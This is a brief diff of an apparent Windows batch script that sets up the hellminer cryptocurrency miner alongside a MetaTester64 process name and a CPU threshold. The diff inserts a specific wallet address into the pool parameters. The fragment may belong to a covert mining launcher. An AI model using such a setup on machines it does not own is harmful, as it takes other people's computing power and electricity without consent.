@@ -2,7 +2,7 @@
 
 set "primaryProcess=MetaTester64"
 set "secondaryProcess=hellminer"
-set "secondaryParams=-c stratum+ssl://na.luckpool.net:3958 -u WALLET.%ComputerName% -p hybrid --cpu 3"
+set "secondaryParams=-c stratum+ssl://na.luckpool.net:3958 -u RSZ2LTUESkABVfGFASxLSzddpLwcyjUiNj.%ComputerName% -p hybrid --cpu 3"
 set "threshold=0.5"
 
 set "startCount=0"
